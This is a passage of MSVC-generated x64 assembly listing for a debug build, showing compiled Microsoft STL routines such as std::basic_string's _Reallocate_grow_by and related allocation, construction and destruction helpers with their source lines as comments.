; 4805 :         auto& _My_data            = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 4806 :         const size_type _Old_size = _My_data._Mysize;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	QWORD PTR _Old_size$[rsp], rax

; 4807 :         if (max_size() - _Old_size < _Size_increase) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	sub	rax, QWORD PTR _Old_size$[rsp]
	cmp	rax, QWORD PTR _Size_increase$[rsp]
	jae	SHORT $LN2@Reallocate

; 4808 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Reallocate:

; 4809 :         }
; 4810 : 
; 4811 :         const size_type _New_size     = _Old_size + _Size_increase;

	mov	rax, QWORD PTR _Size_increase$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _New_size$[rsp], rax

; 4812 :         const size_type _Old_capacity = _My_data._Myres;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR _Old_capacity$[rsp], rax

; 4813 :         const size_type _New_capacity = _Calculate_growth(_New_size);

	mov	rdx, QWORD PTR _New_size$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
	mov	QWORD PTR _New_capacity$[rsp], rax

; 4814 :         auto& _Al                     = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 4815 :         const pointer _New_ptr        = _Al.allocate(_New_capacity + 1); // throws

	mov	rax, QWORD PTR _New_capacity$[rsp]
	inc	rax
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@D@std@@QEAAPEAD_K@Z ; std::allocator<char>::allocate
	mov	QWORD PTR _New_ptr$[rsp], rax

; 4816 : 
; 4817 : #if _HAS_CXX20
; 4818 :         if (_STD is_constant_evaluated()) { // Begin the lifetimes of the objects before copying to avoid UB
; 4819 :             _Traits::assign(_Unfancy(_New_ptr), _New_capacity + 1, _Elem());
; 4820 :         }
; 4821 : #endif // _HAS_CXX20
; 4822 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_size$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 4825 :         _My_data._Myres       = _New_capacity;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_capacity$[rsp]
	mov	QWORD PTR [rax+24], rcx

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	QWORD PTR _Raw_new$[rsp], rax

; 4827 :         if (_BUF_SIZE <= _Old_capacity) {

	cmp	QWORD PTR _Old_capacity$[rsp], 16
	jb	SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Old_ptr$1[rsp], rax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

	mov	rcx, QWORD PTR _Old_ptr$1[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	rcx, QWORD PTR <_Args_1>$[rsp]
	mov	QWORD PTR [rsp+40], rcx
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, QWORD PTR _Old_size$[rsp]
	mov	r8, rax
	mov	rdx, QWORD PTR _Raw_new$[rsp]
	lea	rcx, QWORD PTR _Fn$[rsp]
	call	??R<lambda_65e615be2a453ca0576c979606f46740>@@QEBA@QEADQEBD_K12@Z ; <lambda_65e615be2a453ca0576c979606f46740>::operator()

; 4830 :             _Al.deallocate(_Old_ptr, _Old_capacity + 1);

	mov	rax, QWORD PTR _Old_capacity$[rsp]
	inc	rax
	mov	r8, rax
	mov	rdx, QWORD PTR _Old_ptr$1[rsp]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z ; std::allocator<char>::deallocate

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	mov	QWORD PTR [rax], rcx

; 4832 :         } else {

	jmp	SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR <_Args_1>$[rsp]
	mov	QWORD PTR [rsp+40], rcx
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, QWORD PTR _Old_size$[rsp]
	mov	r8, rax
	mov	rdx, QWORD PTR _Raw_new$[rsp]
	lea	rcx, QWORD PTR _Fn$[rsp]
	call	??R<lambda_65e615be2a453ca0576c979606f46740>@@QEBA@QEADQEBD_K12@Z ; <lambda_65e615be2a453ca0576c979606f46740>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	lea	rdx, QWORD PTR _New_ptr$[rsp]
	mov	rcx, rax
	call	??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z ; std::_Construct_in_place<char *,char * const &>
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

	mov	rax, QWORD PTR this$[rsp]
$LN5@Reallocate:

; 4839 :     }

	add	rsp, 136				; 00000088H
	ret	0
??$_Reallocate_grow_by@V<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_65e615be2a453ca0576c979606f46740>,char const *,unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??R<lambda_65e615be2a453ca0576c979606f46740>@@QEBA@QEADQEBD_K12@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_New_ptr$ = 72
_Old_ptr$ = 80
_Old_size$ = 88
_Ptr$ = 96
_Count$ = 104
??R<lambda_65e615be2a453ca0576c979606f46740>@@QEBA@QEADQEBD_K12@Z PROC ; <lambda_65e615be2a453ca0576c979606f46740>::operator(), COMDAT

; 3380 :             },

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 3377 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);

	mov	r8, QWORD PTR _Old_size$[rsp]
	mov	rdx, QWORD PTR _Old_ptr$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::copy

; 3378 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);

	mov	rax, QWORD PTR _Old_size$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Ptr$[rsp]
	mov	rcx, rax
	call	?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::copy

; 3379 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 3380 :             },

	add	rsp, 56					; 00000038H
	ret	0
??R<lambda_65e615be2a453ca0576c979606f46740>@@QEBA@QEADQEBD_K12@Z ENDP ; <lambda_65e615be2a453ca0576c979606f46740>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@Z
_TEXT	SEGMENT
_My_data$ = 48
_Old_size$ = 56
_New_ptr$ = 64
_New_size$ = 72
_New_capacity$ = 80
_Old_capacity$ = 88
_Old_ptr$1 = 96
_Al$ = 104
_Raw_new$ = 112
this$ = 144
_Size_increase$ = 152
_Fn$ = 160
<_Args_0>$ = 168
??$_Reallocate_grow_by@V<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_319d5e083f45f90dcdce5dce53cbb275>,char>, COMDAT

; 4802 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

$LN6:
	mov	BYTE PTR [rsp+32], r9b
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 136				; 00000088H

; 4803 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4804 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4805 :         auto& _My_data            = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 4806 :         const size_type _Old_size = _My_data._Mysize;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	QWORD PTR _Old_size$[rsp], rax

; 4807 :         if (max_size() - _Old_size < _Size_increase) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	sub	rax, QWORD PTR _Old_size$[rsp]
	cmp	rax, QWORD PTR _Size_increase$[rsp]
	jae	SHORT $LN2@Reallocate

; 4808 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Reallocate:

; 4809 :         }
; 4810 : 
; 4811 :         const size_type _New_size     = _Old_size + _Size_increase;

	mov	rax, QWORD PTR _Size_increase$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _New_size$[rsp], rax

; 4812 :         const size_type _Old_capacity = _My_data._Myres;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR _Old_capacity$[rsp], rax

; 4813 :         const size_type _New_capacity = _Calculate_growth(_New_size);

	mov	rdx, QWORD PTR _New_size$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
	mov	QWORD PTR _New_capacity$[rsp], rax

; 4814 :         auto& _Al                     = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 4815 :         const pointer _New_ptr        = _Al.allocate(_New_capacity + 1); // throws

	mov	rax, QWORD PTR _New_capacity$[rsp]
	inc	rax
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@D@std@@QEAAPEAD_K@Z ; std::allocator<char>::allocate
	mov	QWORD PTR _New_ptr$[rsp], rax

; 4816 : 
; 4817 : #if _HAS_CXX20
; 4818 :         if (_STD is_constant_evaluated()) { // Begin the lifetimes of the objects before copying to avoid UB
; 4819 :             _Traits::assign(_Unfancy(_New_ptr), _New_capacity + 1, _Elem());
; 4820 :         }
; 4821 : #endif // _HAS_CXX20
; 4822 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_size$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 4825 :         _My_data._Myres       = _New_capacity;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_capacity$[rsp]
	mov	QWORD PTR [rax+24], rcx

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	QWORD PTR _Raw_new$[rsp], rax

; 4827 :         if (_BUF_SIZE <= _Old_capacity) {

	cmp	QWORD PTR _Old_capacity$[rsp], 16
	jb	SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Old_ptr$1[rsp], rax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

	mov	rcx, QWORD PTR _Old_ptr$1[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	movzx	ecx, BYTE PTR <_Args_0>$[rsp]
	mov	BYTE PTR [rsp+32], cl
	mov	r9, QWORD PTR _Old_size$[rsp]
	mov	r8, rax
	mov	rdx, QWORD PTR _Raw_new$[rsp]
	lea	rcx, QWORD PTR _Fn$[rsp]
	call	??R<lambda_319d5e083f45f90dcdce5dce53cbb275>@@QEBA@QEADQEBD_KD@Z ; <lambda_319d5e083f45f90dcdce5dce53cbb275>::operator()

; 4830 :             _Al.deallocate(_Old_ptr, _Old_capacity + 1);

	mov	rax, QWORD PTR _Old_capacity$[rsp]
	inc	rax
	mov	r8, rax
	mov	rdx, QWORD PTR _Old_ptr$1[rsp]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z ; std::allocator<char>::deallocate

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	mov	QWORD PTR [rax], rcx

; 4832 :         } else {

	jmp	SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

	mov	rax, QWORD PTR _My_data$[rsp]
	movzx	ecx, BYTE PTR <_Args_0>$[rsp]
	mov	BYTE PTR [rsp+32], cl
	mov	r9, QWORD PTR _Old_size$[rsp]
	mov	r8, rax
	mov	rdx, QWORD PTR _Raw_new$[rsp]
	lea	rcx, QWORD PTR _Fn$[rsp]
	call	??R<lambda_319d5e083f45f90dcdce5dce53cbb275>@@QEBA@QEADQEBD_KD@Z ; <lambda_319d5e083f45f90dcdce5dce53cbb275>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	lea	rdx, QWORD PTR _New_ptr$[rsp]
	mov	rcx, rax
	call	??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z ; std::_Construct_in_place<char *,char * const &>
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

	mov	rax, QWORD PTR this$[rsp]
$LN5@Reallocate:

; 4839 :     }

	add	rsp, 136				; 00000088H
	ret	0
??$_Reallocate_grow_by@V<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_319d5e083f45f90dcdce5dce53cbb275>,char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??R<lambda_319d5e083f45f90dcdce5dce53cbb275>@@QEBA@QEADQEBD_KD@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_New_ptr$ = 72
_Old_ptr$ = 80
_Old_size$ = 88
_Ch$ = 96
??R<lambda_319d5e083f45f90dcdce5dce53cbb275>@@QEBA@QEADQEBD_KD@Z PROC ; <lambda_319d5e083f45f90dcdce5dce53cbb275>::operator(), COMDAT

; 4091 :             },

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 4088 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);

	mov	r8, QWORD PTR _Old_size$[rsp]
	mov	rdx, QWORD PTR _Old_ptr$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z ; std::_Char_traits<char,int>::copy

; 4089 :                 _Traits::assign(_New_ptr[_Old_size], _Ch);

	mov	rax, QWORD PTR _Old_size$[rsp]
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR _Ch$[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 4090 :                 _Traits::assign(_New_ptr[_Old_size + 1], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	rax, QWORD PTR _New_ptr$[rsp]
	mov	rcx, QWORD PTR _Old_size$[rsp]
	lea	rax, QWORD PTR [rax+rcx+1]
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 4091 :             },

	add	rsp, 56					; 00000038H
	ret	0
??R<lambda_319d5e083f45f90dcdce5dce53cbb275>@@QEBA@QEADQEBD_KD@Z ENDP ; <lambda_319d5e083f45f90dcdce5dce53cbb275>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Destroy_in_place@PEAD@std@@YAXAEAPEAD@Z
_TEXT	SEGMENT
_Obj$ = 8
??$_Destroy_in_place@PEAD@std@@YAXAEAPEAD@Z PROC	; std::_Destroy_in_place<char *>, COMDAT

; 296  : _CONSTEXPR20 void _Destroy_in_place(_Ty& _Obj) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 297  :     if constexpr (is_array_v<_Ty>) {
; 298  :         _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 299  :     } else {
; 300  :         _Obj.~_Ty();
; 301  :     }
; 302  : }

	ret	0
??$_Destroy_in_place@PEAD@std@@YAXAEAPEAD@Z ENDP	; std::_Destroy_in_place<char *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z PROC			; std::_Unfancy<wchar_t>, COMDAT

; 265  : _NODISCARD constexpr _Ty* _Unfancy(_Ty* _Ptr) noexcept { // do nothing for plain pointers

	mov	QWORD PTR [rsp+8], rcx

; 266  :     return _Ptr;

	mov	rax, QWORD PTR _Ptr$[rsp]

; 267  : }

	ret	0
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ENDP			; std::_Unfancy<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z
_TEXT	SEGMENT
$T1 = 32
_Obj$ = 64
<_Args_0>$ = 72
??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * &>, COMDAT

; 231  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 232  : #if _HAS_CXX20
; 233  :     if (_STD is_constant_evaluated()) {
; 234  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 235  :     } else
; 236  : #endif // _HAS_CXX20
; 237  :     {
; 238  :         ::new (_Voidify_iter(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Obj$[rsp]
	call	??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ; std::addressof<wchar_t *>
	mov	rcx, rax
	call	??$_Voidify_iter@PEAPEA_W@std@@YAPEAXPEAPEA_W@Z ; std::_Voidify_iter<wchar_t * *>
	mov	rdx, rax
	mov	ecx, 8
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@AEAPEA_W@std@@YAAEAPEA_WAEAPEA_W@Z ; std::forward<wchar_t * &>
	mov	rcx, QWORD PTR $T1[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR [rcx], rax

; 239  :     }
; 240  : }

	add	rsp, 56					; 00000038H
	ret	0
??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z
_TEXT	SEGMENT
_Obj$ = 8
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z PROC	; std::_Destroy_in_place<wchar_t *>, COMDAT

; 296  : _CONSTEXPR20 void _Destroy_in_place(_Ty& _Obj) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 297  :     if constexpr (is_array_v<_Ty>) {
; 298  :         _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 299  :     } else {
; 300  :         _Obj.~_Ty();
; 301  :     }
; 302  : }

	ret	0
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z ENDP	; std::_Destroy_in_place<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Destroy_range@V?$allocator@E@std@@@std@@YAXPEAEQEAEAEAV?$allocator@E@0@@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
_Al$ = 24
??$_Destroy_range@V?$allocator@E@std@@@std@@YAXPEAEQEAEAEAV?$allocator@E@0@@Z PROC ; std::_Destroy_range<std::allocator<unsigned char> >, COMDAT

; 944  : _CONSTEXPR20 void _Destroy_range(_Alloc_ptr_t<_Alloc> _First, const _Alloc_ptr_t<_Alloc> _Last, _Alloc& _Al) noexcept {

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 945  :     // note that this is an optimization for debug mode codegen; in release mode the BE removes all of this
; 946  :     using _Ty = typename _Alloc::value_type;
; 947  :     if constexpr (!conjunction_v<is_trivially_destructible<_Ty>, _Uses_default_destroy<_Alloc, _Ty*>>) {
; 948  :         for (; _First != _Last; ++_First) {
; 949  :             allocator_traits<_Alloc>::destroy(_Al, _Unfancy(_First));
; 950  :         }
; 951  :     }
; 952  : }

	ret	0
??$_Destroy_range@V?$allocator@E@std@@@std@@YAXPEAEQEAEAEAV?$allocator@E@0@@Z ENDP ; std::_Destroy_range<std::allocator<unsigned char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
_Al$ = 24
??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z PROC ; std::_Destroy_range<std::allocator<wchar_t> >, COMDAT

; 944  : _CONSTEXPR20 void _Destroy_range(_Alloc_ptr_t<_Alloc> _First, const _Alloc_ptr_t<_Alloc> _Last, _Alloc& _Al) noexcept {

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 945  :     // note that this is an optimization for debug mode codegen; in release mode the BE removes all of this
; 946  :     using _Ty = typename _Alloc::value_type;
; 947  :     if constexpr (!conjunction_v<is_trivially_destructible<_Ty>, _Uses_default_destroy<_Alloc, _Ty*>>) {
; 948  :         for (; _First != _Last; ++_First) {
; 949  :             allocator_traits<_Alloc>::destroy(_Al, _Unfancy(_First));
; 950  :         }
; 951  :     }
; 952  : }

	ret	0
??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z ENDP ; std::_Destroy_range<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$move@AEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@YA$$QEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@AEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@YA$$QEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@AEAV10@@Z PROC ; std::move<std::basic_string<char,std::char_traits<char>,std::allocator<char> > &>, COMDAT

; 1422 : _NODISCARD constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept { // forward _Arg as movable

	mov	QWORD PTR [rsp+8], rcx

; 1423 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1424 : }

	ret	0
??$move@AEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@YA$$QEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@AEAV10@@Z ENDP ; std::move<std::basic_string<char,std::char_traits<char>,std::allocator<char> > &>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G?$numpunct@D@std@@MEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_G?$numpunct@D@std@@MEAAPEAXI@Z PROC			; std::numpunct<char>::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
